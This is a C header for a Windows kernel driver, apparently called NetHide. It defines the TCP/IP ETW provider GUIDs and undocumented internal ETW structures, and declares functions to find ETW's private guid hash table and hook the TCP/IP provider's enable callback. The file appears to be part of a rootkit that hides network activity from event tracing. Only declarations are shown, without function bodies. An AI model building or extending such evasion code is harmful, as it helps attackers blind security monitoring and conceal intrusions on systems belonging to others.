#pragma once
#include <ntddk.h>
#include <evntprov.h>
#include "filter.h"

static const GUID TcpIpGuid = { 
    0x9a280ac0, 0xc8e0, 0x11d1, 
    { 0x84, 0xe2, 0x00, 0xc0, 0x4f, 0xb9, 0x98, 0xa2 } 
};

static const GUID MsTcpIpGuid = {
    0x2f07e2ee, 0x15db, 0x40f1,
    { 0x90, 0xef, 0x9d, 0x7b, 0xa2, 0x82, 0x18, 0x8a }
};

typedef struct _ETW_GUID_ENTRY {
    LIST_ENTRY      GuidList;
    LONG64          RefCount;
    GUID            Guid;
    LIST_ENTRY      RegListHead;
    PVOID           SecurityDescriptor;
    ULONG64         LastEnable;
} ETW_GUID_ENTRY, *PETW_GUID_ENTRY;

typedef struct _ETW_REG_ENTRY {
    LIST_ENTRY      RegList;
    LIST_ENTRY      GroupRegList;
    PETW_GUID_ENTRY GuidEntry;
    PETW_GUID_ENTRY GroupEntry;
    PVOID           Callback;
    PVOID           CallbackContext;
    ULONG64         Index;
    ULONG64         Padding;
} ETW_REG_ENTRY, *PETW_REG_ENTRY;

typedef struct _ETW_HASH_BUCKET {
    LIST_ENTRY      ListHead;
    EX_PUSH_LOCK    BucketLock;
} ETW_HASH_BUCKET, *PETW_HASH_BUCKET;

typedef VOID (NTAPI *PETWENABLECALLBACK)(
    LPCGUID SourceId, ULONG ControlCode, UCHAR Level,
    ULONGLONG MatchAnyKeyword, ULONGLONG MatchAllKeyword,
    PEVENT_FILTER_DESCRIPTOR FilterData, PVOID CallbackContext
);

#define EVENT_CONTROL_CODE_DISABLE_PROVIDER 0
#define EVENT_CONTROL_CODE_ENABLE_PROVIDER  1
#define EVENT_CONTROL_CODE_CAPTURE_STATE    2

extern BOOLEAN g_ProviderHookEnabled;
extern PETW_GUID_ENTRY g_TcpIpGuidEntry;
extern PETWENABLECALLBACK g_OriginalTcpIpCallback;

NTSTATUS NetHideInitialize();
VOID NetHideCleanup();
PETW_GUID_ENTRY FindEtwGuidEntry(PGUID TargetGuid);
NTSTATUS HookProviderCallback(PETW_GUID_ENTRY GuidEntry);
VOID UnhookProviderCallback();
VOID NTAPI HookedEnableCallback(LPCGUID SourceId, ULONG ControlCode, UCHAR Level,
    ULONGLONG MatchAnyKeyword, ULONGLONG MatchAllKeyword,
    PEVENT_FILTER_DESCRIPTOR FilterData, PVOID CallbackContext);
PVOID FindEtwpGuidHashTable();
